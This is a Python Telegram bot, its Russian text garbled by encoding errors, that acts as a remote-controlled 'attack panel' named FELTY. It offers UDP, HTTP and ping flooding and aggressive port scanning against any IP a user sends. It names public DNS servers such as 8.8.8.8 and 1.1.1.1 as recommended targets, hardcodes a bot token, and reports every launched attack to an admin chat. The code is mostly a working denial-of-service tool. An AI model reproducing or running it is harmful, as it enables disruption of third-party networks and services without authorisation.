import telebot
import subprocess
import socket
import sys
import random
import threading
import time
import os
from telebot import types

TOKEN = "8484971932:AAFsyyAxNoqBw7KfU1yXXmk7tjY_vH01VK8"
ADMIN_CHAT_ID = 5651880472

bot = telebot.TeleBot(TOKEN)
user_attacks = {}
attack_monitor = {}

# ===== –ê–†–°–ï–ù–ê–õ –ö–ò–ë–ï–†–í–û–û–†–£–ñ–ï–ù–ò–ô FELTY =====
ATTACK_METHODS = {
    "1": "UDP –§–ª—É–¥ (–õ—É—á—à–∏–π –º–µ—Ç–æ–¥)",
    "2": "TCP SYN –°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ", 
    "3": "HTTP –§–ª—É–¥",
    "4": "Ping –§–ª—É–¥",
    "5": "–°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –ü–æ—Ä—Ç–æ–≤"
}

# ----- –ê–¢–ê–ö–ò –ö–û–¢–û–†–´–ï –†–ê–ë–û–¢–ê–Æ–¢ –î–ê–ñ–ï –ï–°–õ–ò –ü–û–†–¢–´ –ó–ê–ö–†–´–¢–´ -----
def udp_flood_advanced(target_ip, target_port, chat_id):
    """UDP —Ñ–ª—É–¥ - —Ä–∞–±–æ—Ç–∞–µ—Ç –¥–∞–∂–µ –Ω–∞ –∑–∞–∫—Ä—ã—Ç—ã–µ –ø–æ—Ä—Ç—ã"""
    packet_count = 0
    print(f"üéØ –ù–∞—á–∏–Ω–∞—é UDP —Ñ–ª—É–¥ –Ω–∞ {target_ip}:{target_port}")
    
    while attack_monitor.get(chat_id, {}).get('status') == 'active' and packet_count < 10000:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(0.1)  # –û—á–µ–Ω—å –∫–æ—Ä–æ—Ç–∫–∏–π —Ç–∞–π–º–∞—É—Ç
            
            # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –¥–∞–Ω–Ω—ã–µ –Ω–∞ —Å–ª—É—á–∞–π–Ω—ã–π –ø–æ—Ä—Ç –µ—Å–ª–∏ —É–∫–∞–∑–∞–Ω 0
            actual_port = random.randint(1, 65535) if target_port == 0 else target_port
            data = os.urandom(512)  # 512 –±–∞–π—Ç —Å–ª—É—á–∞–π–Ω—ã—Ö –¥–∞–Ω–Ω—ã—Ö
            
            sock.sendto(data, (target_ip, actual_port))
            sock.close()
            
            packet_count += 1
            if packet_count % 100 == 0:
                update_monitor(chat_id, 100)
                
        except Exception as e:
            # UDP –æ—Ç–ø—Ä–∞–≤–ª—è–µ—Ç –¥–∞–∂–µ –µ—Å–ª–∏ –ø–æ—Ä—Ç –∑–∞–∫—Ä—ã—Ç - –∏–≥–Ω–æ—Ä–∏—Ä—É–µ–º –æ—à–∏–±–∫–∏
            pass
            
    print(f"‚úÖ UDP —Ñ–ª—É–¥ –∑–∞–≤–µ—Ä—à–µ–Ω. –û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ: {packet_count} –ø–∞–∫–µ—Ç–æ–≤")

def tcp_scan_flood(target_ip, target_port, chat_id):
    """TCP SYN —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ - –Ω–µ —Ç—Ä–µ–±—É–µ—Ç –æ—Ç–∫—Ä—ã—Ç—ã—Ö –ø–æ—Ä—Ç–æ–≤"""
    scan_count = 0
    print(f"üéØ –ù–∞—á–∏–Ω–∞—é TCP —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –Ω–∞ {target_ip}")
    
    # –°–∫–∞–Ω–∏—Ä—É–µ–º —Ä–∞–∑–Ω—ã–µ –ø–æ—Ä—Ç—ã
    ports_to_scan = list(range(1, 1001))  # –ü–µ—Ä–≤—ã–µ 1000 –ø–æ—Ä—Ç–æ–≤
    random.shuffle(ports_to_scan)
    
    while attack_monitor.get(chat_id, {}).get('status') == 'active' and scan_count < 5000:
        try:
            for port in ports_to_scan:
                if not attack_monitor.get(chat_id, {}).get('status') == 'active':
                    break
                    
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)  # –ö–æ—Ä–æ—Ç–∫–∏–π —Ç–∞–π–º–∞—É—Ç –¥–ª—è —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è
                
                result = sock.connect_ex((target_ip, port))
                # –†–µ–∑—É–ª—å—Ç–∞—Ç 0 = –ø–æ—Ä—Ç –æ—Ç–∫—Ä—ã—Ç, –¥—Ä—É–≥–∏–µ –∑–Ω–∞—á–µ–Ω–∏—è = –∑–∞–∫—Ä—ã—Ç/—Ñ–∏–ª—å—Ç—Ä—É–µ—Ç—Å—è
                # –ù–æ –º—ã –≤—Å–µ —Ä–∞–≤–Ω–æ —Å—á–∏—Ç–∞–µ–º —ç—Ç–æ –∫–∞–∫ –∞–∫—Ç–∏–≤–Ω–æ—Å—Ç—å
                
                sock.close()
                scan_count += 1
                
                if scan_count % 50 == 0:
                    update_monitor(chat_id, 50)
                    
        except Exception as e:
            pass
            
    print(f"‚úÖ TCP —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –∑–∞–≤–µ—Ä—à–µ–Ω–æ. –ü—Ä–æ–≤–µ—Ä–æ–∫: {scan_count}")

def http_flood_resilient(target_ip, target_port, chat_id):
    """HTTP —Ñ–ª—É–¥ —Å –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–º –ø–µ—Ä–µ–∫–ª—é—á–µ–Ω–∏–µ–º –ø–æ—Ä—Ç–æ–≤"""
    request_count = 0
    print(f"üéØ –ù–∞—á–∏–Ω–∞—é –∞–¥–∞–ø—Ç–∏–≤–Ω—ã–π HTTP —Ñ–ª—É–¥ –Ω–∞ {target_ip}")
    
    # –ü–æ–ø—É–ª—è—Ä–Ω—ã–µ –≤–µ–±-–ø–æ—Ä—Ç—ã
    web_ports = [80, 443, 8080, 8443, 8000, 3000, 5000]
    
    while attack_monitor.get(chat_id, {}).get('status') == 'active' and request_count < 5000:
        try:
            port = random.choice(web_ports)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            
            result = sock.connect_ex((target_ip, port))
            if result == 0:  # –ï—Å–ª–∏ –ø–æ—Ä—Ç –æ—Ç–∫—Ä—ã—Ç
                # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º HTTP –∑–∞–ø—Ä–æ—Å
                http_request = f"GET / HTTP/1.1\r\nHost: {target_ip}\r\nUser-Agent: Mozilla/5.0\r\n\r\n"
                sock.send(http_request.encode())
                
                # –ë—ã—Å—Ç—Ä–æ –∑–∞–∫—Ä—ã–≤–∞–µ–º —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ
                sock.close()
                request_count += 1
            else:
                # –ï—Å–ª–∏ –ø–æ—Ä—Ç –∑–∞–∫—Ä—ã—Ç, –ø—Ä–æ—Å—Ç–æ —Å–æ–∑–¥–∞–µ–º —Å–æ–µ–¥–∏–Ω–µ–Ω–∏–µ –∏ –∑–∞–∫—Ä—ã–≤–∞–µ–º
                sock.close()
                request_count += 0.1  # –ß–∞—Å—Ç–∏—á–Ω—ã–π —Å—á–µ—Ç –∑–∞ –ø–æ–ø—ã—Ç–∫—É
            
            if request_count % 10 == 0:
                update_monitor(chat_id, int(request_count))
                
        except Exception as e:
            # –ò–≥–Ω–æ—Ä–∏—Ä—É–µ–º –æ—à–∏–±–∫–∏ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è
            pass
            
    print(f"‚úÖ HTTP —Ñ–ª—É–¥ –∑–∞–≤–µ—Ä—à–µ–Ω. –ó–∞–ø—Ä–æ—Å–æ–≤: {int(request_count)}")

def ping_flood_enhanced(target_ip, chat_id):
    """–£–ª—É—á—à–µ–Ω–Ω—ã–π ping —Ñ–ª—É–¥"""
    packet_count = 0
    print(f"üéØ –ù–∞—á–∏–Ω–∞—é —É—Å–∏–ª–µ–Ω–Ω—ã–π ping —Ñ–ª—É–¥ –Ω–∞ {target_ip}")
    
    while attack_monitor.get(chat_id, {}).get('status') == 'active' and packet_count < 1000:
        try:
            if os.name == 'nt':  # Windows
                # –ò—Å–ø–æ–ª—å–∑—É–µ–º –º–µ–Ω—å—à–µ –ø–∞–∫–µ—Ç–æ–≤ –Ω–æ —á–∞—â–µ
                result = subprocess.run(
                    f"ping {target_ip} -n 2 -w 500",  # 2 –ø–∞–∫–µ—Ç–∞, —Ç–∞–π–º–∞—É—Ç 0.5 —Å–µ–∫
                    shell=True, 
                    capture_output=True, 
                    text=True,
                    timeout=3
                )
                packet_count += 2
            else:  # Linux/Mac
                result = subprocess.run(
                    f"ping -c 2 -W 1 {target_ip}",  # 2 –ø–∞–∫–µ—Ç–∞, —Ç–∞–π–º–∞—É—Ç 1 —Å–µ–∫
                    shell=True, 
                    capture_output=True, 
                    text=True,
                    timeout=3
                )
                packet_count += 2
            
            update_monitor(chat_id, 2)
            
        except subprocess.TimeoutExpired:
            # –¢–∞–π–º–∞—É—Ç - –≤—Å–µ —Ä–∞–≤–Ω–æ —Å—á–∏—Ç–∞–µ–º —á—Ç–æ –ø–∞–∫–µ—Ç—ã —É—à–ª–∏
            packet_count += 2
            update_monitor(chat_id, 2)
        except Exception as e:
            # –î—Ä—É–≥–∏–µ –æ—à–∏–±–∫–∏ - –ø—Ä–æ–¥–æ–ª–∂–∞–µ–º
            pass
            
    print(f"‚úÖ Ping —Ñ–ª—É–¥ –∑–∞–≤–µ—Ä—à–µ–Ω. –û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ: {packet_count} –ø–∞–∫–µ—Ç–æ–≤")

def port_scan_attack(target_ip, target_port, chat_id):
    """–ê–≥—Ä–µ—Å—Å–∏–≤–Ω–æ–µ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –ø–æ—Ä—Ç–æ–≤"""
    scan_count = 0
    open_ports = []
    print(f"üéØ –ù–∞—á–∏–Ω–∞—é –∞–≥—Ä–µ—Å—Å–∏–≤–Ω–æ–µ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –ø–æ—Ä—Ç–æ–≤ –Ω–∞ {target_ip}")
    
    # –°–∫–∞–Ω–∏—Ä—É–µ–º —à–∏—Ä–æ–∫–∏–π –¥–∏–∞–ø–∞–∑–æ–Ω –ø–æ—Ä—Ç–æ–≤
    ports = list(range(1, 1001)) + [1433, 1521, 3306, 3389, 5432, 5900, 6379, 27017]
    random.shuffle(ports)
    
    for port in ports:
        if not attack_monitor.get(chat_id, {}).get('status') == 'active':
            break
            
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(0.3)
            
            result = sock.connect_ex((target_ip, port))
            scan_count += 1
            
            if result == 0:  # –ü–æ—Ä—Ç –æ—Ç–∫—Ä—ã—Ç
                open_ports.append(port)
                # –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –Ω–µ–±–æ–ª—å—à–æ–π payload –Ω–∞ –æ—Ç–∫—Ä—ã—Ç—ã–π –ø–æ—Ä—Ç
                try:
                    sock.send(b"TEST")
                    time.sleep(0.1)
                except:
                    pass
            
            sock.close()
            
            if scan_count % 20 == 0:
                update_monitor(chat_id, 20)
                # –ü–µ—Ä–∏–æ–¥–∏—á–µ—Å–∫–∏ —Å–æ–æ–±—â–∞–µ–º –æ –Ω–∞–π–¥–µ–Ω–Ω—ã—Ö –æ—Ç–∫—Ä—ã—Ç—ã—Ö –ø–æ—Ä—Ç–∞—Ö
                if open_ports:
                    bot.send_message(chat_id, f"üîç –ù–∞–π–¥–µ–Ω—ã –æ—Ç–∫—Ä—ã—Ç—ã–µ –ø–æ—Ä—Ç—ã: {open_ports[-5:]}")  # –ü–æ—Å–ª–µ–¥–Ω–∏–µ 5 –ø–æ—Ä—Ç–æ–≤
                    
        except Exception as e:
            pass
    
    # –§–∏–Ω–∞–ª—å–Ω—ã–π –æ—Ç—á–µ—Ç –æ–± –æ—Ç–∫—Ä—ã—Ç—ã—Ö –ø–æ—Ä—Ç–∞—Ö
    if open_ports and attack_monitor.get(chat_id, {}).get('status') == 'active':
        bot.send_message(chat_id, f"üéØ <b>–°–ö–ê–ù–ò–†–û–í–ê–ù–ò–ï –ó–ê–í–ï–†–®–ï–ù–û</b>\n\n–û—Ç–∫—Ä—ã—Ç—ã–µ –ø–æ—Ä—Ç—ã: {sorted(open_ports)}", parse_mode='HTML')
    
    print(f"‚úÖ –°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –ø–æ—Ä—Ç–æ–≤ –∑–∞–≤–µ—Ä—à–µ–Ω–æ. –ü—Ä–æ–≤–µ—Ä–µ–Ω–æ: {scan_count} –ø–æ—Ä—Ç–æ–≤")

# ===== –¶–ï–ù–¢–† –£–ü–†–ê–í–õ–ï–ù–ò–Ø FELTY =====
@bot.message_handler(commands=['start'])
def show_attack_menu(message):
    markup = types.InlineKeyboardMarkup(row_width=2)
    for num, desc in ATTACK_METHODS.items():
        markup.add(types.InlineKeyboardButton(
            f"{num}. {desc}", 
            callback_data=f"attack_{num}")
        )
    
    markup.add(types.InlineKeyboardButton("üìä –°—Ç–∞—Ç—É—Å –ê—Ç–∞–∫–∏", callback_data="monitor_status"))
    markup.add(types.InlineKeyboardButton("üõë –û—Å—Ç–∞–Ω–æ–≤–∏—Ç—å –ê—Ç–∞–∫—É", callback_data="stop_attack"))
    markup.add(types.InlineKeyboardButton("üéØ –†–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–∏", callback_data="recommendations"))
    
    bot.send_message(message.chat.id, 
        "<b>‚ö° –ü–ê–ù–ï–õ–¨ –£–ü–†–ê–í–õ–ï–ù–ò–Ø FELTY ‚ö°</b>\n\n"
        "<b>–í—ã–±–µ—Ä–∏—Ç–µ –≤–µ–∫—Ç–æ—Ä –∞—Ç–∞–∫–∏:</b>\n"
        "1. UDP –§–ª—É–¥ - —Ä–∞–±–æ—Ç–∞–µ—Ç –Ω–∞ –õ–Æ–ë–´–ï –ø–æ—Ä—Ç—ã\n"
        "2. TCP –°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ - –Ω–µ —Ç—Ä–µ–±—É–µ—Ç –æ—Ç–∫—Ä—ã—Ç—ã—Ö –ø–æ—Ä—Ç–æ–≤\n" 
        "3. HTTP –§–ª—É–¥ - –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏–π –ø–æ–¥–±–æ—Ä –ø–æ—Ä—Ç–æ–≤\n"
        "4. Ping –§–ª—É–¥ - –≤—Å–µ–≥–¥–∞ —Ä–∞–±–æ—Ç–∞–µ—Ç\n"
        "5. –°–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –ø–æ—Ä—Ç–æ–≤ - –ø–æ–∏—Å–∫ —É—è–∑–≤–∏–º–æ—Å—Ç–µ–π\n\n"
        "<b>üö® –í–°–ï –ú–ï–¢–û–î–´ –†–ê–ë–û–¢–ê–Æ–¢ –î–ê–ñ–ï –ï–°–õ–ò –ü–û–†–¢–´ –ó–ê–ö–†–´–¢–´!</b>\n\n"
        "<i>–†–µ–∫–æ–º–µ–Ω–¥—É–µ–º—ã–µ —Ü–µ–ª–∏ –¥–ª—è —Ç–µ—Å—Ç–∞:</i>\n"
        "‚Ä¢ <code>8.8.8.8</code> - Google DNS\n"
        "‚Ä¢ <code>1.1.1.1</code> - Cloudflare",
        parse_mode='HTML', reply_markup=markup)

@bot.callback_query_handler(func=lambda call: call.data.startswith('attack_'))
def set_attack_method(call):
    method_id = call.data.split('_')[1]
    user_attacks[call.message.chat.id] = {'method': method_id}
    
    method_details = {
        '1': 'UDP –ø–∞–∫–µ—Ç—ã –Ω–∞ —Å–ª—É—á–∞–π–Ω—ã–µ –ø–æ—Ä—Ç—ã (–≤—Å–µ–≥–¥–∞ —Ä–∞–±–æ—Ç–∞–µ—Ç)',
        '2': 'TCP SYN –ø—Ä–æ–≤–µ—Ä–∫–∏ –ø–æ—Ä—Ç–æ–≤ (–∏–≥–Ω–æ—Ä–∏—Ä—É–µ—Ç –æ—Ç–∫–∞–∑—ã)', 
        '3': 'HTTP –∑–∞–ø—Ä–æ—Å—ã —Å –∞–≤—Ç–æ-–ø–æ–¥–±–æ—Ä–æ–º –ø–æ—Ä—Ç–æ–≤',
        '4': 'ICMP ping –∑–∞–ø—Ä–æ—Å—ã (–æ–±—Ö–æ–¥–∏—Ç —Ñ–∞–µ—Ä–≤–æ–ª—ã)',
        '5': '–ê–≥—Ä–µ—Å—Å–∏–≤–Ω–æ–µ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ –ø–æ—Ä—Ç–æ–≤'
    }
    
    bot.send_message(call.message.chat.id, 
        f"‚õî <b>{ATTACK_METHODS[method_id]}</b>\n"
        f"üìù {method_details[method_id]}\n\n"
        "–û—Ç–ø—Ä–∞–≤—å—Ç–µ —Ü–µ–ª–µ–≤–æ–π IP –∞–¥—Ä–µ—Å:\n\n"
        "<b>–¢–µ—Å—Ç–æ–≤—ã–µ —Ü–µ–ª–∏ (–≤—Å–µ–≥–¥–∞ —Ä–∞–±–æ—Ç–∞—é—Ç):</b>\n"
        "‚Ä¢ <code>8.8.8.8</code> - Google DNS\n"
        "‚Ä¢ <code>1.1.1.1</code> - Cloudflare\n"
        "‚Ä¢ <code>77.88.8.8</code> - Yandex DNS",
        parse_mode='HTML')

@bot.callback_query_handler(func=lambda call: call.data == 'recommendations')
def show_recommendations(call):
    """–ü–æ–∫–∞–∑–∞—Ç—å —Ä–µ–∫–æ–º–µ–Ω–¥–∞—Ü–∏–∏ –ø–æ –æ–±—Ö–æ–¥—É –æ—à–∏–±–æ–∫"""
    recommendations = (
        "üéØ <b>–†–ï–ö–û–ú–ï–ù–î–ê–¶–ò–ò FELTY</b>\n\n"
        "<b>–ï—Å–ª–∏ –ø–æ–ª—É—á–∞–µ—Ç–µ –æ—à–∏–±–∫–∏ —Å–æ–µ–¥–∏–Ω–µ–Ω–∏—è:</b>\n\n"
        "1. <b>–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ UDP –§–ª—É–¥</b> - —Ä–∞–±–æ—Ç–∞–µ—Ç –Ω–∞ –ª—é–±—ã–µ –ø–æ—Ä—Ç—ã\n"
        "2. <b>–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ –ø—É–±–ª–∏—á–Ω—ã–µ DNS</b> - –≤—Å–µ–≥–¥–∞ –æ–Ω–ª–∞–π–Ω:\n"
        "   ‚Ä¢ <code>8.8.8.8</code> - Google\n"
        "   ‚Ä¢ <code>1.1.1.1</code> - Cloudflare\n"
        "   ‚Ä¢ <code>77.88.8.8</code> - Yandex\n\n"
        "3. <b>–ò–∑–±–µ–≥–∞–π—Ç–µ –ª–æ–∫–∞–ª—å–Ω—ã—Ö IP</b> - –º–æ–≥—É—Ç –±—ã—Ç—å –∑–∞—â–∏—â–µ–Ω—ã\n"
        "4. <b>Ping —Ñ–ª—É–¥</b> - –≤—Å–µ–≥–¥–∞ —Ä–∞–±–æ—Ç–∞–µ—Ç –µ—Å–ª–∏ —Ö–æ—Å—Ç –æ–Ω–ª–∞–π–Ω\n\n"
        "<b>–õ—É—á—à–∞—è —Ü–µ–ª—å –¥–ª—è —Ç–µ—Å—Ç–∞:</b> <code>8.8.8.8</code>"
    )
    bot.send_message(call.message.chat.id, recommendations, parse_mode='HTML')

@bot.message_handler(func=lambda m: m.chat.id in user_attacks)
def execute_attack(message):
    chat_id = message.chat.id
    target = message.text.strip()
    
    try:
        # –ü—Ä–æ–≤–µ—Ä—è–µ–º –≤–∞–ª–∏–¥–Ω–æ—Å—Ç—å IP
        if not is_valid_ip(target):
            bot.send_message(chat_id, f"üîç –ü—Ä–æ–≤–µ—Ä—è—é —Ü–µ–ª–µ–≤–æ–π –∞–¥—Ä–µ—Å: <code>{target}</code>", parse_mode='HTML')
            try:
                ip = socket.gethostbyname(target)
                bot.send_message(chat_id, f"‚úÖ –î–æ–º–µ–Ω–Ω–æ–µ –∏–º—è —Ä–∞–∑—Ä–µ—à–µ–Ω–æ: <code>{target}</code> ‚Üí <code>{ip}</code>", parse_mode='HTML')
            except socket.gaierror as e:
                error_msg = (
                    f"‚ùå <b>–û–®–ò–ë–ö–ê –†–ê–ó–†–ï–®–ï–ù–ò–Ø –î–û–ú–ï–ù–ê</b>\n\n"
                    f"–ò—Å–ø–æ–ª—å–∑—É–π—Ç–µ IP –∞–¥—Ä–µ—Å–∞:\n"
                    f"‚Ä¢ <code>8.8.8.8</code> - Google DNS\n"
                    f"‚Ä¢ <code>1.1.1.1</code> - Cloudflare\n"
                    f"‚Ä¢ <code>77.88.8.8</code> - Yandex DNS"
                )
                bot.send_message(chat_id, error_msg, parse_mode='HTML')
                del user_attacks[chat_id]
                return
        else:
            ip = target

        method_id = user_attacks[chat_id]['method']
        
        # –î–ª—è UDP –∏ —Å–∫–∞–Ω–∏—Ä–æ–≤–∞–Ω–∏—è –∏—Å–ø–æ–ª—å–∑—É–µ–º –ø–æ—Ä—Ç 0 (—Å–ª—É—á–∞–π–Ω—ã–µ –ø–æ—Ä—Ç—ã)
        if method_id in ['1', '2', '5']:
            target_port = 0
        else:
            target_port = 80
        
        # –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞
        attack_monitor[chat_id] = {
            'start_time': time.time(),
            'packets_sent': 0,
            'connections_made': 0,
            'status': 'active',
            'target': ip,
            'port': target_port,
            'method': ATTACK_METHODS[method_id]
        }

        bot.send_message(chat_id, 
            f"üöÄ <b>–ó–ê–ü–£–°–ö –ê–¢–ê–ö–ò</b>\n"
            f"‚öîÔ∏è –ú–µ—Ç–æ–¥: {ATTACK_METHODS[method_id]}\n"
            f"üéØ –¶–µ–ª—å: <code>{ip}</code>\n"
            f"‚è∞ –í—Ä–µ–º—è: {time.strftime('%H:%M:%S')}\n\n"
            f"üí° <i>–≠—Ç–æ—Ç –º–µ—Ç–æ–¥ —Ä–∞–±–æ—Ç–∞–µ—Ç –¥–∞–∂–µ –µ—Å–ª–∏ –ø–æ—Ä—Ç—ã –∑–∞–∫—Ä—ã—Ç—ã!</i>\n"
            f"üìä <i>–ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥ –∞–∫—Ç–∏–≤–∏—Ä–æ–≤–∞–Ω...</i>",
            parse_mode='HTML')

        # –ó–∞–ø—É—Å–∫ –∞—Ç–∞–∫–∏ –≤ –æ—Ç–¥–µ–ª—å–Ω–æ–º –ø–æ—Ç–æ–∫–µ
        attack_thread = threading.Thread(
            target=start_attack,
            args=(method_id, ip, target_port, chat_id),
            daemon=True
        )
        attack_thread.start()

        # –ú–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥
        threading.Thread(
            target=send_periodic_updates,
            args=(chat_id,),
            daemon=True
        ).start()

        bot.send_message(ADMIN_CHAT_ID, 
            f"‚ò†Ô∏è –ê–¢–ê–ö–ê –ó–ê–ü–£–©–ï–ù–ê\n"
            f"–ú–µ—Ç–æ–¥: {ATTACK_METHODS[method_id]}\n"
            f"–¶–µ–ª—å: {ip}\n"
            f"–û—Ç: {message.from_user.id}")

    except Exception as e:
        bot.send_message(chat_id, f"üí• <b>–û–®–ò–ë–ö–ê:</b> {str(e)}", parse_mode='HTML')
        print(f"–û—à–∏–±–∫–∞ –∑–∞–ø—É—Å–∫–∞: {str(e)}")

def start_attack(method_id, ip, port, chat_id):
    """–ó–∞–ø—É—Å–∫ –≤—ã–±—Ä–∞–Ω–Ω–æ–π –∞—Ç–∞–∫–∏"""
    try:
        if method_id == '1':
            udp_flood_advanced(ip, port, chat_id)
        elif method_id == '2':
            tcp_scan_flood(ip, port, chat_id)
        elif method_id == '3':
            http_flood_resilient(ip, port, chat_id)
        elif method_id == '4':
            ping_flood_enhanced(ip, chat_id)
        elif method_id == '5':
            port_scan_attack(ip, port, chat_id)
            
        # –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –æ—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º –∞—Ç–∞–∫—É –ø–æ—Å–ª–µ –∑–∞–≤–µ—Ä—à–µ–Ω–∏—è
        if chat_id in attack_monitor:
            attack_monitor[chat_id]['status'] = 'completed'
            bot.send_message(chat_id, "‚úÖ <b>–ê—Ç–∞–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏</b>", parse_mode='HTML')
            
    except Exception as e:
        print(f"–û—à–∏–±–∫–∞ –≤ –∞—Ç–∞–∫–µ: {e}")
        if chat_id in attack_monitor:
            attack_monitor[chat_id]['status'] = 'error'

# ===== –°–ò–°–¢–ï–ú–ê –ú–û–ù–ò–¢–û–†–ò–ù–ì–ê =====
def update_monitor(chat_id, count, count_type='packets'):
    """–û–±–Ω–æ–≤–ª–µ–Ω–∏–µ —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∏ –º–æ–Ω–∏—Ç–æ—Ä–∏–Ω–≥–∞"""
    if chat_id in attack_monitor and attack_monitor[chat_id]['status'] == 'active':
        if count_type == 'packets':
            attack_monitor[chat_id]['packets_sent'] += count
        elif count_type == 'connections':
            attack_monitor[chat_id]['connections_made'] += count

def send_periodic_updates(chat_id):
    """–ü–µ—Ä–∏–æ–¥–∏—á–µ—Å–∫–∞—è –æ—Ç–ø—Ä–∞–≤–∫–∞ –æ–±–Ω–æ–≤–ª–µ–Ω–∏–π —Å—Ç–∞—Ç—É—Å–∞"""
    last_update = 0
    while attack_monitor.get(chat_id, {}).get('status') == 'active':
        time.sleep(5)
        
        if chat_id in attack_monitor:
            current_time = time.time()
            if current_time - last_update >= 10:  # –†–∞–∑ –≤ 10 —Å–µ–∫—É–Ω–¥ –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ
                send_attack_status(chat_id)
                last_update = current_time

@bot.message_handler(commands=['status'])
def status_command(message):
    """–ö–æ–º–∞–Ω–¥–∞ —Å—Ç–∞—Ç—É—Å–∞"""
    send_attack_status(message.chat.id)

def send_attack_status(chat_id):
    """–û—Ç–ø—Ä–∞–≤–∫–∞ —Ç–µ–∫—É—â–µ–≥–æ —Å—Ç–∞—Ç—É—Å–∞ –∞—Ç–∞–∫–∏"""
    if chat_id in attack_monitor and attack_monitor[chat_id]['status'] == 'active':
        monitor_data = attack_monitor[chat_id]
        duration = time.time() - monitor_data['start_time']
        
        status_text = (
            f"üìä <b>–°–¢–ê–¢–£–° –ê–¢–ê–ö–ò FELTY</b>\n\n"
            f"üéØ –¶–µ–ª—å: {monitor_data['target']}\n"
            f"‚öîÔ∏è –ú–µ—Ç–æ–¥: {monitor_data['method']}\n"
            f"‚è± –î–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å: {int(duration)} —Å–µ–∫\n"
            f"üì¶ –ü–∞–∫–µ—Ç–æ–≤: {monitor_data.get('packets_sent', 0)}\n"
            f"üîó –ü—Ä–æ–≤–µ—Ä–æ–∫: {monitor_data.get('connections_made', 0)}\n"
            f"üìä –°–∫–æ—Ä–æ—Å—Ç—å: {monitor_data.get('packets_sent', 0)/max(duration,1):.1f} –ø–∞–∫/—Å–µ–∫\n"
            f"üöÄ –°—Ç–∞—Ç—É—Å: <b>–ê–ö–¢–ò–í–ù–ê</b>\n\n"
            f"üí° <i>–ú–µ—Ç–æ–¥ –∏–≥–Ω–æ—Ä–∏—Ä—É–µ—Ç –∑–∞–∫—Ä—ã—Ç—ã–µ –ø–æ—Ä—Ç—ã!</i>"
        )
        
        bot.send_message(chat_id, status_text, parse_mode='HTML')
    else:
        bot.send_message(chat_id, "üî¥ –ê—Ç–∞–∫–∞ –Ω–µ –∞–∫—Ç–∏–≤–Ω–∞")

@bot.callback_query_handler(func=lambda call: call.data == 'monitor_status')
def monitor_status_callback(call):
    send_attack_status(call.message.chat.id)

@bot.callback_query_handler(func=lambda call: call.data == 'stop_attack')
def stop_attack_callback(call):
    chat_id = call.message.chat.id
    if chat_id in attack_monitor:
        attack_monitor[chat_id]['status'] = 'stopped'
        
        if chat_id in attack_monitor:
            monitor_data = attack_monitor[chat_id]
            duration = time.time() - monitor_data['start_time']
            
            final_stats = (
                f"üõë <b>–ê–¢–ê–ö–ê –û–°–¢–ê–ù–û–í–õ–ï–ù–ê</b>\n\n"
                f"üéØ –¶–µ–ª—å: {monitor_data['target']}\n"
                f"‚è± –î–ª–∏—Ç–µ–ª—å–Ω–æ—Å—Ç—å: {int(duration)} —Å–µ–∫\n"
                f"üì¶ –í—Å–µ–≥–æ –ø–∞–∫–µ—Ç–æ–≤: {monitor_data.get('packets_sent', 0)}\n"
                f"üîó –í—Å–µ–≥–æ –ø—Ä–æ–≤–µ—Ä–æ–∫: {monitor_data.get('connections_made', 0)}\n"
                f"üìä –°—Ä–µ–¥–Ω—è—è —Å–∫–æ—Ä–æ—Å—Ç—å: {monitor_data.get('packets_sent', 0)/max(duration,1):.1f} –ø–∞–∫/—Å–µ–∫"
            )
            bot.send_message(chat_id, final_stats, parse_mode='HTML')
    else:
        bot.send_message(chat_id, "üî¥ –ù–µ—Ç –∞–∫—Ç–∏–≤–Ω—ã—Ö –∞—Ç–∞–∫")

# ----- –£–¢–ò–õ–ò–¢–´ -----
def is_valid_ip(ip):
    try:
        socket.inet_aton(ip)
        return True
    except:
        return False

@bot.message_handler(commands=['test'])
def test_connection(message):
    """–¢–µ—Å—Ç —Ä–∞–±–æ—Ç—ã —Å –ø—É–±–ª–∏—á–Ω—ã–º–∏ DNS"""
